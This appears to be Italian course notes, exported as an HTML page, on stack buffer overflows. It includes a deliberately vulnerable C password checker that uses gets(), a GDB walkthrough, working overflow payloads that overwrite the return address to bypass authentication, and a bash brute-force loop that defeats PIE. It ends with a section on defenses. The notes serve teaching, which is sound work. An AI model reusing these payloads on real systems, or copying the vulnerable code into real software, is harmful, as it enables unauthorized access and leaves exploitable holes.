@@ -1,0 +1,176 @@
+﻿<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>2024-10-16_Stack overflow</title>
+  <link rel="stylesheet" href="https://stackedit.io/style.css" />
+</head>
+
+<body class="stackedit">
+  <div class="stackedit__left">
+    <div class="stackedit__toc">
+      
+<ul>
+<li><a href="#stack-overflow">Stack overflow</a>
+<ul>
+<li><a href="#esempio">Esempio</a></li>
+<li><a href="#altre-tecniche-di-attacco">Altre tecniche di attacco</a></li>
+<li><a href="#difese">Difese</a></li>
+</ul>
+</li>
+</ul>
+
+    </div>
+  </div>
+  <div class="stackedit__right">
+    <div class="stackedit__html">
+      <h1 id="stack-overflow">Stack overflow</h1>
+<p>Un buffer overflow che si verifica nello stack, si chiama <strong>stack overflow</strong>.</p>
+<p>Subito dopo le variabili locali, nello stack sono presenti il <strong>vecchio stack pointer</strong> e l’<strong>indirizzo di ritorno</strong>. Uno stack overflow può sovrascriverli per modificare il flusso di codice ed eseguire codice arbitrario.</p>
+<p><img src="https://i.ibb.co/sPGp08Y/image.png" alt="https://i.ibb.co/sPGp08Y/image.png"></p>
+<ol>
+<li>la <code>mov</code> mette in <code>rax</code> il valore di ritorno <code>b</code></li>
+<li>la <code>leave</code> sposta lo <em>stack pointer</em> sul <code>return address</code> e sposta il <em>base pointer</em> all’indirizzo <code>old rbp</code></li>
+<li>la <code>ret</code> imposta l’<em>instruction pointer</em> all’indirizzo <code>return address</code> (cioè all’istruzione successiva rispetto al momento della chiamata della funzione <code>func</code>)</li>
+</ol>
+<p>L’idea per sfruttare lo stack overflow è quella di andare a <strong>modificare il <em>return address</em></strong> con un altro che porta a del codice arbitrario.</p>
+<h2 id="esempio">Esempio</h2>
+<p>Considerando il seguente codice:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">checkpassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		
+		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Insert password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		
+		<span class="token comment">// reads password, no check on length!</span>
+		<span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"sEgr3t0"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+				<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+		<span class="token keyword">else</span>
+				<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkpassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Authenticated!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		<span class="token keyword">else</span> <span class="token punctuation">{</span>
+				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Supponiamo che la password non possa essere sovrascritta e non possa essere ottenuta dal file binario.</p>
+<h3 id="caso-1">Caso 1</h3>
+<p>Se compiliamo disabilitando dei sistemi di sicurezza, ad esempio <strong>PIE e lo stack protector</strong></p>
+<p><code>gcc stack-pwd.c -o stack-pwd -fno-stack-protector --no-pie --static</code></p>
+<p>Analizziamo il programma con GDB:</p>
+<pre class=" language-bash"><code class="prism  language-bash">gdb stack-pwd -q
+</code></pre>
+<p>impostando un breakpoint sulla funzione <code>checkpassword</code> e poi facendo <code>nexti</code> per eseguire l’istruzione che alloca il buffer <code>s</code>.</p>
+<p>lanciando il comando i seguenti comandi visualizziamo lo stato dello stack:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">break</span> checkpassword
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> run
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> nexti
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info registers
+<span class="token punctuation">..</span>.
+rbp            0x7fffffffe570
+rsp            0x7fffffffe560
+<span class="token punctuation">..</span>.
+</code></pre>
+<p>possiamo ispezionare lo stack</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/4gx <span class="token variable">$rsp</span>
+0x7fffffffe560: 0x00007fffffffe6b8      0x0000000000400400
+0x7fffffffe570: 0x00007fffffffe590      0x0000000000400bc0
+<span class="token comment">#indirizzo:      primi 8 byte            secondi 8 byte</span>
+</code></pre>
+<p>la prima riga è l’indirizzo dove punta lo <em>stack pointer</em> e all’interno c’è solo dati sporcizia, sono lo spazio allocato per il buffer di 16 byte.</p>
+<p>la seconda riga è dove punta il <em>base pointer</em> e nei primi 8 byte contiene l’indirizzo al vecchio <em>base pointer</em>, mentre nei successivi 8 byte contiene l’indirizzo di ritorno.</p>
+<p>L’obiettivo è quello di riempire il buffer, per poi sovrascrivere gli 8 byte contenenti l’indirizzo del vecchio base pointer e poi sovrascrivere l’indirizzo di ritorno con un nuovo indirizzo che punta dove vogliamo.</p>
+<p>Troviamo l’indirizzo di ritorno che vogliamo sovrascrivere:<br>
+facendo il disassembly del main</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass main
+Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> main:
+   0x0000000000400ba7 <span class="token operator">&lt;</span>+0<span class="token operator">&gt;</span>:     push   rbp
+   0x0000000000400ba8 <span class="token operator">&lt;</span>+1<span class="token operator">&gt;</span>:     mov    rbp,rsp
+   0x0000000000400bab <span class="token operator">&lt;</span>+4<span class="token operator">&gt;</span>:     sub    rsp,0x10
+   0x0000000000400baf <span class="token operator">&lt;</span>+8<span class="token operator">&gt;</span>:     mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,edi
+   0x0000000000400bb2 <span class="token operator">&lt;</span>+11<span class="token operator">&gt;</span>:    mov    QWORD PTR <span class="token punctuation">[</span>rbp-0x10<span class="token punctuation">]</span>,rsi
+   0x0000000000400bb6 <span class="token operator">&lt;</span>+15<span class="token operator">&gt;</span>:    mov    eax,0x0
+   0x0000000000400bbb <span class="token operator">&lt;</span>+20<span class="token operator">&gt;</span>:    call   0x400b4d <span class="token operator">&lt;</span>checkpassword<span class="token operator">&gt;</span>   <span class="token comment"># invoca checkpassword</span>
+   0x0000000000400bc0 <span class="token operator">&lt;</span>+25<span class="token operator">&gt;</span>:    <span class="token function">test</span>   eax,eax
+   0x0000000000400bc2 <span class="token operator">&lt;</span>+27<span class="token operator">&gt;</span>:    je     0x400bd8 <span class="token operator">&lt;</span>main+49<span class="token operator">&gt;</span>
+   0x0000000000400bc4 <span class="token operator">&lt;</span>+29<span class="token operator">&gt;</span>:    mov    edi,0x49241e
+   0x0000000000400bc9 <span class="token operator">&lt;</span>+34<span class="token operator">&gt;</span>:    call   0x410500 <span class="token operator">&lt;</span>puts<span class="token operator">&gt;</span>     <span class="token comment">#stampa in output</span>
+   0x0000000000400bce <span class="token operator">&lt;</span>+39<span class="token operator">&gt;</span>:    mov    edi,0x0
+   0x0000000000400bd3 <span class="token operator">&lt;</span>+44<span class="token operator">&gt;</span>:    call   0x40eab0 <span class="token operator">&lt;</span>exit<span class="token operator">&gt;</span>
+   0x0000000000400bd8 <span class="token operator">&lt;</span>+49<span class="token operator">&gt;</span>:    mov    edi,0x49242d
+   0x0000000000400bdd <span class="token operator">&lt;</span>+54<span class="token operator">&gt;</span>:    call   0x410500 <span class="token operator">&lt;</span>puts<span class="token operator">&gt;</span>     <span class="token comment">#stampa in output</span>
+   0x0000000000400be2 <span class="token operator">&lt;</span>+59<span class="token operator">&gt;</span>:    mov    edi,0x1
+   0x0000000000400be7 <span class="token operator">&lt;</span>+64<span class="token operator">&gt;</span>:    call   0x40eab0 <span class="token operator">&lt;</span>exit<span class="token operator">&gt;</span>
+</code></pre>
+<p>Andando ad ispezionare i parametri passati alla funzione <code>puts</code> possiamo capire dove vogliamo ritornare infatti:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/s 0x49241e
+0x49241e:       <span class="token string">"Authenticated!"</span>
+</code></pre>
+<p>vogliamo quindi saltare all’istruzione con indirizzo <code>0x0000000000400bc4 &lt;+29&gt;</code></p>
+<p>Eseguendo il programma con questo input funziona:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token keyword">echo</span> -e <span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAA\xc4\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="token operator">|</span> ./stack-pwd
+Insert password: Authenticated<span class="token operator">!</span>
+</code></pre>
+<p>Vengono usate 24 ‘A’ per sovrascrivere i 16 byte del buffer e gli 8 byte per il vecchio base pointer, i rimanente 8 byte vengono sovrascritti con il nuovo indirizzo (in <em>little endian</em>)</p>
+<h3 id="caso-2">Caso 2</h3>
+<p>Se compiliamo disabilitando solo lo <strong>stack protector.</strong></p>
+<p><code>gcc stack-pwd.c -o stack-pwd-pie -fno-stack-protector</code></p>
+<p>In questo caso gli indirizzi vengono randomizzati ad ogni esecuzione, tranne gli ultimi 3 caratteri esadecimali (quindi un byte e mezzo, 12 bit) che sono un offset fisso.</p>
+<p>Se facciamo un disassemly del main otteniamo:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass main 
+ 0x000000000000085c <span class="token operator">&lt;</span>+20<span class="token operator">&gt;</span>:    call   0x7ea <span class="token operator">&lt;</span>checkpassword<span class="token operator">&gt;</span>
+ 0x0000000000000861 <span class="token operator">&lt;</span>+25<span class="token operator">&gt;</span>:    <span class="token function">test</span>   eax,eax               <span class="token comment">#ritorno previsto</span>
+ 0x0000000000000863 <span class="token operator">&lt;</span>+27<span class="token operator">&gt;</span>:    je     0x87b <span class="token operator">&lt;</span>main+51<span class="token operator">&gt;</span>
+ 0x0000000000000865 <span class="token operator">&lt;</span>+29<span class="token operator">&gt;</span>:    lea    rdi,<span class="token punctuation">[</span>rip+0xd2<span class="token punctuation">]</span>        <span class="token comment">#ritorno che vogliamo</span>
+ 0x000000000000086c <span class="token operator">&lt;</span>+36<span class="token operator">&gt;</span>:    call   0x670 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
+</code></pre>
+<p>Abbiamo quindi i primi 13 caratteri randomizzati mentre gli ultimi 3 sono fissi.</p>
+<p>Per riuscire nell’attacco dovremmo quindi sovrascrivere gli ultimi due byte con l’offset che interessa a noi, ad esempio <code>0x65 0x08</code> e ripetere l’attacco fino a che randomicamente l’indirizzo non termina con <code>00 08 65</code></p>
+<p>Dove <code>00</code> è il carattere di fine stringa sul nostro input, <code>08</code> è il un byte che abbiamo sovrascritto (di cui solo <code>8</code> fa parte dell’offset) e <code>65</code> è l’altro byte che abbiamo sovrascritto che fa parte interamente dell’offset.</p>
+<p>Dato che <code>865</code> è l’offset fisso devo ripetere l’attacco finché davanti all’offset non appare in modo randomico <code>000</code>.</p>
+<p>uno script bash per tentare è il seguente:</p>
+<pre class=" language-bash"><code class="prism  language-bash">i<span class="token operator">=</span>1<span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token keyword">echo</span> -e <span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAA\x65\x08"</span> <span class="token operator">|</span> ./stack-pwd-pie  <span class="token operator">|</span> <span class="token function">grep</span> Auth<span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span> i<span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">|</span> <span class="token function">grep</span> -B 1 Auth
+</code></pre>
+<h2 id="altre-tecniche-di-attacco">Altre tecniche di attacco</h2>
+<ul>
+<li>Un <strong>shellcode</strong> è un pezzo di codice macchina (solitamente in linguaggio assembly) che un attaccante inserisce nello stack. Una volta che lo stack viene sovrascritto, l’attaccante modifica il puntatore di ritorno  per eseguire il proprio shellcode. In genere, questo codice apre una “shell” che consente il controllo remoto della macchina compromessa.</li>
+<li><strong>Return to syscall / libc</strong>: In questa tecnica, piuttosto che iniettare il codice direttamente (come uno shellcode), l’attaccante sfrutta funzioni di sistema esistenti, come quelle della <em>libc</em> (la libreria C standard), che sono già caricate in memoria. Ad esempio, l’attaccante può sovrascrivere lo stack in modo che l’esecuzione del programma “ritorni” a una funzione di sistema critica, come <code>system()</code>, che esegue comandi.</li>
+<li>Il <strong>Return Oriented Programming (ROP)</strong> permette di concatenare una serie di istruzioni assembly (chiamate gadget) già presenti nel binario stesso o nelle librerie di sistema (come <em>libc</em>) al fine di eseguire del codice a piacere. L’idea è simile all’attacco precedente, ma con ROP si possono combinare vari gadget per creare un comportamento complesso senza la necessità di iniettare nuovo codice.</li>
+</ul>
+<h2 id="difese">Difese</h2>
+<p>Si possono adottare delle difese contro lo stack overflow, in particolare difese a tempo di compilazione e a run-time.</p>
+<h3 id="difese-a-tempo-di-compilazione">Difese a tempo di compilazione</h3>
+<p>Il metodo è quello di scrivere programmi più resistenti a questo tipo di attacco:</p>
+<ul>
+<li><strong>Utilizzo di linguaggi sicuri</strong>: è consigliato utilizzare linguaggi di programmazione sicuri che gestiscono automaticamente le dimensioni dei buffer e le eccezioni, limitando l’uso di linguaggi non sicuri solo quando strettamente necessario (es. per l’accesso diretto all’hardware o per performance estreme).</li>
+<li><strong>Tecniche di codifica sicura</strong>: verificare sempre i limiti dei buffer e utilizzare funzioni di libreria sicure.</li>
+<li><strong>Protezione dello stack</strong>: il compilatore può aggiungere codice aggiuntivo per monitorare la corruzione dello stack. Una tecnica comune è l’uso di un <strong>canary</strong>, un valore casuale inserito dopo il vecchio base pointer di un frame.
+<ul>
+<li><strong>Canary</strong>: quando una funzione inizia, un valore casuale (canary) viene copiato nello allo stack. Prima che la funzione ritorni, il canary viene confrontato con il valore originale e, se non corrisponde, il programma abortisce. Questa tecnica è molto efficace nel prevenire overflow dello stack, ma è vulnerabile se il valore del canary viene trapelato o se un attaccante può accedere direttamente allo stack.</li>
+</ul>
+</li>
+</ul>
+<h3 id="difese-a-run-time">Difese a run-time</h3>
+<ul>
+<li><strong>Non-eXecutable address space (NX)</strong>: questa difesa impedisce l’esecuzione di codice in segmenti di memoria specifici (come stack o heap), richiedendo il supporto hardware. Blocca l’esecuzione di <strong>shellcode</strong>, ma non impedisce attacchi come <strong>return to syscall</strong>, <strong>libc</strong> o <strong>ROP</strong>. Alcuni programmi disabilitano NX se necessitano di eseguire codice sullo stack.</li>
+<li><strong>Address Space Layout Randomization (ASLR)</strong>: l’ASLR randomizza la disposizione della memoria del programma, rendendo più difficile per un attaccante conoscere gli indirizzi esatti a cui fare return dopo uno stack overflow. Tuttavia, può essere aggirata con tecniche di brute-force o se gli indirizzi di memoria vengono rivelati</li>
+</ul>
+
+    </div>
+  </div>
+</body>
+
+</html>
